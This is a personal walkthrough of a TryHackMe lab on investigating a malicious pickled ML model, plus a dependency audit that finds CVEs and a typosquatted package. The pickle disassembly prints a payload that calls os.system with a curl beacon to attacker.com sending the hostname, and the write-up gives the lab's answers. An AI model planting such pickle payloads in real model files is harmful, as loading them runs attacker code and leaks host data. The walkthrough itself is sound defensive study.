# Hands-on lab: Investigate a malicious model 

# Room Link (Premium)

[Link](https://tryhackme.com/room/supplychain-attack-vectors)

# Setup

### Credentials

analyst:analyst123

I am using my own KALI machine installed locally, so I will try logging into the machine using SSH. For those who uses the machine provided by TryHackMe, this step can be skipped.

Logging in into SSH:

```bash
ssh analyst@10.48.191.102
```
**IP address may be different, so check using your TryHackMe machine after starting it!**

Now I am logged in to the shell with the welcome page:

```bash

  ╔══════════════════════════════════════════════╗
  ║   AI Supply Chain Security Module Lab        ║
  ╚══════════════════════════════════════════════╝

  Lab root:  /opt/supply-chain/
  Tools:     fickling, modelscan, pip-audit, syft, inspect_h5_model.py
  Type 'help-lab' for command reference.

```

We are given the Lab directory and the tools to use.

## Challenge

what external domain does the malicious model attempt to contact?

What pickle opcode executes the function specified by STACK_GLOBAL?

What package vulnerabilities that are detected using `pip-audit`?

# Thinking process

## First challenge

The first thing is to list the files in the Lab root.

```bash
analyst@tryhackme-2204:~$ cd /opt/supply-chain/
analyst@tryhackme-2204:/opt/supply-chain$ ls -la
total 36
drwxr-xr-x 8 analyst analyst 4096 Apr  8 12:02 .
drwxr-xr-x 4 root    root    4096 Apr  8 11:59 ..
-rw-r--r-- 1 root    root      26 Apr  8 12:02 .vm_version
drwxr-xr-x 5 analyst analyst 4096 Apr  8 11:59 audit
drwxr-xr-x 3 analyst analyst 4096 Apr  8 15:19 dependencies
drwxr-xr-x 6 analyst analyst 4096 Apr  8 11:59 incident
drwxr-xr-x 2 analyst analyst 4096 Apr  8 11:59 models
drwxr-xr-x 3 analyst analyst 4096 Apr  8 11:59 project
drwxr-xr-x 2 analyst analyst 4096 Apr  8 12:02 tools

```

Well, I got stuck here, not knowing what to do. The welcome page provides a command called `help-lab`, which lists the use of commands for this machine.

```bash

  AI Supply Chain Security Module Lab — Command Reference
  ═══════════════════════════════════════════════════

  ANALYSIS TOOLS
  ──────────────
  python3 -m pickletools <file>              Safe pickle disassembly
  fickling --check-safety -p <file>          Static pickle analysis
  modelscan -p <file>                        Multi-format model scan
  pip-audit -r <requirements.txt>            Dependency vulnerability scan
  syft <dir> -o table                        SBOM generation
  sha256sum <file>                           Checksum verification
  python3 /opt/supply-chain/tools/inspect_h5_model.py <file>
                                             Keras .h5 layer inspection

  FILE INSPECTION
  ───────────────
  file <model>                               Check actual file type
  ls -lh /opt/supply-chain/models/           List model files
  python3 /opt/supply-chain/tools/safe_analysis.py <file>

  DIRECTORY LAYOUT
  ────────────────
  /opt/supply-chain/models/        Supply Chain Attack Vectors + Securing the AI Supply Chain
  /opt/supply-chain/dependencies/  Supply Chain Attack Vectors requirements files
  /opt/supply-chain/project/       Securing the AI Supply Chain sample ML project
  /opt/supply-chain/incident/      Payload incident response
  /opt/supply-chain/audit/         Checkpoint vendor audit

```

Then, I think to list the model files to see what's inside:

```bash
analyst@tryhackme-2204:/opt/supply-chain$ ls -lh /opt/supply-chain/models/
total 12M
-rwxr-xr-x 1 analyst analyst  297 Apr  8 11:59 checksums.json
-rwxr-xr-x 1 analyst analyst 8.1M Apr  8 11:59 code_reviewer.pkl
-rwxr-xr-x 1 analyst analyst 2.0M Apr  8 11:59 code_reviewer_v1.pkl
-rwxr-xr-x 1 analyst analyst 787K Apr  8 11:59 image_classifier.h5
-rwxr-xr-x 1 analyst analyst 788K Apr  8 11:59 image_classifier_v2.h5
-rwxr-xr-x 1 analyst analyst   81 Apr  8 11:59 model_review_v2.pkl
-rwxr-xr-x 1 analyst analyst  162 Apr  8 11:59 product_recommender.pkl
-rwxr-xr-x 1 analyst analyst 6.2K Apr  8 11:59 product_recommender.safetensors
```

I ended up stuck and look at the steps that TryHackMe has given. 

From the TryHackMe page, I will try follow the steps:

1. Examine File properties

According to the page, the **suspicious file** has larger content. From the files listed above, the file that has the largest content is `code_reviewer.pkl`. Now we know that the file `code_reviewer.pkl` is suspicious.

2. Inspect with Pickletools (Safe)

Pretty straightforward.

From there, we get the answer from the challenge.

Output:

```bash
analyst@tryhackme-2204:/opt/supply-chain/models$ python3 -m pickletools code_reviewer.pkl 
    0: \x80 PROTO      4
    2: \x95 FRAME      72
   11: \x8c SHORT_BINUNICODE 'os'
   15: \x94 MEMOIZE    (as 0)
   16: \x8c SHORT_BINUNICODE 'system'
   24: \x94 MEMOIZE    (as 1)
   25: \x93 STACK_GLOBAL
   26: \x94 MEMOIZE    (as 2)
   27: \x8c SHORT_BINUNICODE 'curl http://attacker.com/beacon?host=$(hostname)'
   77: \x94 MEMOIZE    (as 3)
   78: \x85 TUPLE1
   79: \x94 MEMOIZE    (as 4)
   80: R    REDUCE
   81: \x94 MEMOIZE    (as 5)
   82: .    STOP
highest protocol among opcodes = 4
```

Answer to the **first** challenge: `attacker.com`

## Second challenge

How do we identify the pickle opcode?

Fast forward to step 5, which is **Safe analysis**.

It is located at the same directory with inspect h5 model python file.

It provides a summary if a file is malicious or not, as a helper script.

```bash
analyst@tryhackme-2204:/opt/supply-chain/models$ python3 ../tools/safe_analysis.py code_reviewer.pkl
=== Pickle Safety Analysis ===
File: code_reviewer.pkl
Size: 8.4 MB

Dangerous opcodes found:
  [CRITICAL] STACK_GLOBAL: os.system
  [CRITICAL] REDUCE: executes os.system with arguments

Suspicious strings:
  [CRITICAL] 'curl http://attacker.com/beacon?host=$(hostname)'

Verdict: UNSAFE - Contains executable code targeting os.system

```

I tried to answer `system` or `python` in the answer, it says it is not correct. 

I looked at the third step, which explains about the dangerous opcodes. 

According to TryHackMe, it mentions that line 25 contains a pickle opcode that executes python function. 

From this, I can see that the opcode is located in the source code.

```bash
analyst@tryhackme-2204:/opt/supply-chain/models$ cat code_reviewer.pkl
��H�os��system����0curl http://attacker.com/beacon?host=$(hostname)���R�.
```

Nothing interesting.

I realised that the opcode that **executes** STACK_GLOBAL is REDUCE. It is the function that executes STACK_GLOBAL itself. 

So, the answer is: `reduce`.

## Third Challenge

We can find several malformed packages using pip-audit. 

```bash
analyst@tryhackme-2204:/opt/supply-chain/dependencies$ pip-audit -r requirements_external.txt 
Found 37 known vulnerabilities in 3 packages
Name         Version ID               Fix Versions
------------ ------- ---------------- ------------
torch        2.1.0   PYSEC-2025-41    2.6.0
torch        2.1.0   PYSEC-2025-41    2.6.0
torch        2.1.0   PYSEC-2024-250   2.2.0
torch        2.1.0   PYSEC-2024-251   2.2.0
torch        2.1.0   PYSEC-2024-252   2.2.0
torch        2.1.0   PYSEC-2024-259   2.5.0
torch        2.1.0   CVE-2025-2953    2.7.1rc1
torch        2.1.0   CVE-2025-3730    2.8.0
transformers 4.35.0  PYSEC-2023-301   4.36.0
transformers 4.35.0  PYSEC-2023-300   4.36.0
transformers 4.35.0  PYSEC-2024-227   4.48.0
transformers 4.35.0  PYSEC-2024-228   4.48.0
transformers 4.35.0  PYSEC-2024-229   4.48.0
transformers 4.35.0  PYSEC-2024-229   4.48.0
transformers 4.35.0  PYSEC-2024-228   4.48.0
transformers 4.35.0  PYSEC-2024-227   4.48.0
transformers 4.35.0  PYSEC-2025-40    4.49.0
transformers 4.35.0  CVE-2024-3568    4.38.0
transformers 4.35.0  CVE-2024-12720   4.48.0
transformers 4.35.0  CVE-2025-1194    4.50.0
transformers 4.35.0  CVE-2025-3263    4.51.0
transformers 4.35.0  CVE-2025-3264    4.51.0
transformers 4.35.0  CVE-2025-3777    4.52.1
transformers 4.35.0  CVE-2025-3933    4.52.1
transformers 4.35.0  CVE-2025-5197    4.53.0
transformers 4.35.0  CVE-2025-6638    4.53.0
transformers 4.35.0  CVE-2025-6051    4.53.0
transformers 4.35.0  CVE-2025-6921    4.53.0
transformers 4.35.0  CVE-2026-1839    5.0.0rc3
pillow       9.2.0   PYSEC-2022-42980 9.3.0
pillow       9.2.0   PYSEC-2023-175   10.0.1
pillow       9.2.0   PYSEC-2023-227   10.0.0
pillow       9.2.0   OSV-2022-715
pillow       9.2.0   OSV-2022-1074
pillow       9.2.0   CVE-2023-50447   10.2.0
pillow       9.2.0   CVE-2023-4863    10.0.1
pillow       9.2.0   CVE-2024-28219   10.3.0

```

Hmm, it does not have errors in it. This is because we do not direct the error into standard output yet, since we just outputting the results.

Here is when it is run with standard error passed into standard output:

```bash
analyst@tryhackme-2204:/opt/supply-chain/dependencies$ pip-audit -r ./requirements_external.txt 2>&1
ERROR:pip_audit._virtual_env:internal pip failure: ERROR: Could not find a version that satisfies the requirement numppy==1.24.0 (from versions: none)
ERROR: No matching distribution found for numppy==1.24.0

ERROR:pip_audit._cli:Failed to install packages: ['/tmp/tmp49gb0633/bin/python3', '-m', 'pip', 'install', '--no-input', '--keyring-provider=subprocess', '--dry-run', '--report', '/tmp/tmpwkxc6q68/tmpbffj_oom', '-r', '/opt/supply-chain/dependencies/requirements_external.txt']
```

It provides the error message, which shows the typo of packages that are invalid.

So, the answer to this challenge is `numppy`. 